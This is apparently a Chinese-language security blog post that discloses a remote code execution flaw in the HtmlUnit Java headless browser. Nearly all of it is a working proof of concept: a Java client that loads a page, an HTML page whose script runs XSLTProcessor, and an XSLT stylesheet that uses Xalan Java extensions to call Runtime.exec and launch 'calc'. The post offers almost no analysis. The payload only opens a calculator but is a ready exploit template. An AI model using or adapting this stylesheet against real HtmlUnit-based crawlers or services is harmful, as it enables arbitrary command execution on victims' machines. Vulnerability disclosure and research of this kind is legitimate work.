            <section class="markdown-body" itemprop="articleBody">
              <p>HtmlUnit 适用于java的无头浏览器，我其实觉得不算无头浏览器吧更像爬虫，最新版本也可以做到浏览攻击者网页触发RCE</p>
<p>先简单放个图，后面来补</p>
<p><img src="/2022/12/30/HtmlUnit-RCE/1.png" alt="1"></p>
<p>其实真的蛮简单的就不分析了，我那天只是偶尔看了下就找到了，不过最近xslt好像比较火来着呢</p>
<p>Test.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> HtmlUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.gargoylesoftware.htmlunit.WebClient;</span><br><span class="line"><span class="keyword">import</span> com.gargoylesoftware.htmlunit.html.HtmlPage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="keyword">final</span> <span class="type">WebClient</span> <span class="variable">webClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebClient</span>()) &#123;</span><br><span class="line">            <span class="comment">// no you have a running browser and you can start doing real things</span></span><br><span class="line">            <span class="comment">// like going to a web page</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> <span class="type">HtmlPage</span> <span class="variable">page</span> <span class="operator">=</span> webClient.getPage(<span class="string">&quot;http://xxx/htmlunit.html&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>htmlunit.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">createXmlDocument</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="property">implementation</span>.<span class="title function_">createDocument</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span>  <span class="title function_">loadXMLDocumentFromFile</span>(<span class="params">file</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        xhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        xhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, file, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">        xhttp.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> xhttp.<span class="property">responseXML</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> xmlDoc = <span class="title function_">createXmlDocument</span>();</span></span><br><span class="line"><span class="language-javascript">    xmlDoc.<span class="property">async</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">    xmlDoc = <span class="title function_">loadXMLDocumentFromFile</span>(<span class="string">&quot;1.xml&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> xslDoc = <span class="title function_">createXmlDocument</span>();</span></span><br><span class="line"><span class="language-javascript">    xslDoc.<span class="property">async</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">    xslDoc = <span class="title function_">loadXMLDocumentFromFile</span>(<span class="string">&quot;2.xml&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> processor = <span class="keyword">new</span> <span class="title class_">XSLTProcessor</span>();</span></span><br><span class="line"><span class="language-javascript">    processor.<span class="title function_">importStylesheet</span>(xslDoc);</span></span><br><span class="line"><span class="language-javascript">    processor.<span class="title function_">transformToDocument</span>(xmlDoc);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">s</span>&gt;</span><span class="tag">&lt;/<span class="name">s</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">xmlns:rt</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;</span> <span class="attr">xmlns:ob</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;rtobject&quot;</span> <span class="attr">select</span>=<span class="string">&quot;rt:getRuntime()&quot;</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;process&quot;</span> <span class="attr">select</span>=<span class="string">&quot;rt:exec($rtobject,&#x27;calc&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;processString&quot;</span> <span class="attr">select</span>=<span class="string">&quot;ob:toString($process)&quot;</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$processString&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>
